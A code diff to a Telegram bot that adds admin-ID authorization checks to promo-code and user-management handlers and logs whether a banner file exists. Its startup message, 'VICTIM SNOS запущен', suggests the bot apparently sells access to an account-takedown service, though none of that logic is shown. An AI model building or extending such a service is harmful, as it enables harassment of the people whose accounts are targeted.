@@ -1895,6 +2027,8 @@ async def admin_promo_code(msg: types.Message, state: FSMContext):
 
 @dp.message(StateFilter(AdminState.waiting_promo_days))
 async def admin_promo_days(msg: types.Message, state: FSMContext):
+    if msg.from_user.id != ADMIN_ID:
+        return
     try:
         days = int(msg.text.strip())
         await state.update_data(promo_days=days)
@@ -1907,6 +2041,8 @@ async def admin_promo_days(msg: types.Message, state: FSMContext):
 
 @dp.message(StateFilter(AdminState.waiting_promo_uses))
 async def admin_promo_uses(msg: types.Message, state: FSMContext):
+    if msg.from_user.id != ADMIN_ID:
+        return
     try:
         uses = int(msg.text.strip())
         data = await state.get_data()
@@ -1925,7 +2061,9 @@ async def admin_promo_uses(msg: types.Message, state: FSMContext):
 
 @dp.callback_query(F.data == "admin_remove")
 async def admin_remove(cb: types.CallbackQuery):
-    if cb.from_user.id != ADMIN_ID or not ALLOWED_USERS:
+    if cb.from_user.id != ADMIN_ID:
+        return
+    if not ALLOWED_USERS:
         await cb.answer("Нет пользователей", show_alert=True)
         return
     builder = InlineKeyboardBuilder()
@@ -1947,6 +2085,8 @@ async def admin_remove_process(cb: types.CallbackQuery):
 
 @dp.callback_query(F.data == "admin_list")
 async def admin_list(cb: types.CallbackQuery):
+    if cb.from_user.id != ADMIN_ID:
+        return
     text = "Разрешенные пользователи:\n\n"
     for uid, data in ALLOWED_USERS.items():
         expire = data.get("expire_date", "неизвестно")
@@ -2029,6 +2169,12 @@ async def main():
     load_payments()
     load_promo_codes()
     logger.info("VICTIM SNOS запущен")
+    
+    # Проверяем наличие баннера
+    if os.path.exists(BANNER_PATH):
+        logger.info(f"Баннер найден: {BANNER_PATH}")
+    else:
+        logger.warning(f"Баннер не найден: {BANNER_PATH}")
     
     await bot.delete_webhook(drop_pending_updates=True)
     await dp.start_polling(bot)
